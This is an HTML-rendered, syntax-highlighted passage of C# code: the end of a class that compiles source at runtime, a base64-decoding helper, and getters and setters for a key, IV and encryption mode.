            </span><span class="sc11">CompilerResults</span><span class="sc0"> </span><span class="sc11">results</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc10">.</span><span class="sc11">CompileAssemblyFromSource</span><span class="sc10">(</span><span class="sc11">cp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
            
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">DeCode</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">decbuff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">UTF8</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">decbuff</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    
    
    </span><span class="sc2">//i used to be a java programmer and I still like this way more for get/set methods
</span><span class="sc0">        </span><span class="sc2">//somethings i guess are hard to break :)
</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getKey</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">setKey</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getIV</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">iv</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">setIV</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">iv</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">getEncm</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">encm</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">setEncm</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">encm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
